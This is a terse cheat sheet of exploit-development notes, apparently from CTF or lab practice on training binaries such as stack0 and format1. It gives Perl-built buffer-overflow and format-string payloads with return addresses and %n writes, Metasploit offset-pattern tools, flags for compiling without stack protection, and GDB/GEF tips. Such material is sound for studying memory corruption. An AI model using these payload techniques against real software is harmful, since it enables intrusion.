-   Using PERL for argument.
    ---------------------------------------------------------------------------------------------------------------------------
`perl -e 'print  "\x31\xc0\x50\x68\" . "A"x76 . "\x28\xf4\xff\xbf" '`
`perl -e 'print  "A"x100 '`
inside gdb# run $(perl -e 'print "A"x100')
 
-   Patterns for rewrite 
    ---------------------------------------------------------------------------------------------------------------------------
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 63413563 


-   Compile in Kali with no protection
    ---------------------------------------------------------------------------------------------------------------------------
gcc stack0.c -o stack0 -fno-stack-protector -z execstack -no-pie -m32 -ggdb


-   HEX file representation
    ---------------------------------------------------------------------------------------------------------------------------
xxd pattern
00000000: 4161 3041 6131 4161 3241 6133 4161 3441  Aa0Aa1Aa2Aa3Aa4A
00000010: 6135 4161 3641 6137 4161 3841 6139 4162  a5Aa6Aa7Aa8Aa9Ab

-   Strings search
    ---------------------------------------------------------------------------------------------------------------------------
strings filename
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A


-   Format string example
    ---------------------------------------------------------------------------------------------------------------------------
run $(perl -e 'print "\xcc\xcc\xcc". "\x38\x96\x04\x08" . "%x"x165 . "%n"')
 - \x38\x96\x04\x08 address of parameter to change
 - %n should be padded exactly to location of string "\x38\x96\x04\x08" in the stack
 
First find the writable parameter with %x - in our case %6$x:
perl -e 'print  "AAAABBBB"."\x24\x97\x04\x08"."\x26\x97\x04\x08"."%6\$33956x" ."%6\$n"."%7\$33616x" ."%7\$n" ' > exploit

To make:  0x8049724:	0x080484b8
1) we write 84b8 at 0x8049724
2) we write 010804 at 0x8049726 ( + something to 84b8)
  
-   File info
    ---------------------------------------------------------------------------------------------------------------------------
show  dynamic lynced libraries#     ldd format1
show  calls #                       strace ./format1


-   GEF
    ---------------------------------------------------------------------------------------------------------------------------
- to divide output into 2 windows
run gef in tmux session#    tmux new-session -s shared
run gef #                   gdb -q ./binnary
crutch to make it work#     gef config gef.debug 1


	
